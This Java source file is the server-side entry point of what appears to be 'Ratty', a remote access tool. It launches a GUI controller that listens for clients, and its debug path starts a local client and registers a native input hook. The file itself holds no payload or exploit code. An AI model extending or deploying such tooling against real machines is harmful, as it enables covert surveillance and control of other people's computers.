/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat;

import static de.sogomn.rat.util.Constants.LANGUAGE;

import javax.swing.JOptionPane;

import de.sogomn.rat.gui.IRattyGuiFactory;
import de.sogomn.rat.gui.RattyGuiController;
import de.sogomn.rat.gui.swing.RattySwingGuiFactory;
import de.sogomn.rat.util.Constants;

public final class RattyServer {
	
	private static final boolean DEBUG = false;
	private static final String DEBUG_ADDRESS = "localhost";
	private static final int DEBUG_PORT = 23456;
	
	private static final IRattyGuiFactory GUI_FACTORY = new RattySwingGuiFactory();
	
	private static final String DEBUG_MESSAGE = LANGUAGE.getString("debug.question");
	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
	
	private RattyServer() {
		//...
	}
	
	private static void startDebug() {
		Constants.setSystemLookAndFeel();
		
		final String[] options = {DEBUG_SERVER, DEBUG_CLIENT};
		final int input = JOptionPane.showOptionDialog(null, DEBUG_MESSAGE, null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
		
		if (input == JOptionPane.YES_OPTION) {
			System.out.println(DEBUG_SERVER);
			
			startServer(DEBUG_PORT);
		} else if (input == JOptionPane.NO_OPTION) {
			System.out.println(DEBUG_CLIENT);
			
			RattyClient.registerNativeHook();
			RattyClient.startClient(DEBUG_ADDRESS, DEBUG_PORT);
		}
	}
	
	public static void startServer() {
		Constants.setNimbusLookAndFeel();
		
		new RattyGuiController(GUI_FACTORY);
	}
	
	public static void startServer(final int port) {
		Constants.setNimbusLookAndFeel();
		
		final RattyGuiController controller = new RattyGuiController(GUI_FACTORY);
		
		controller.startServer(port);
	}
	
	public static void main(final String[] args) {
		if (DEBUG) {
			startDebug();
		} else {
			startServer();
		}
	}
	
}
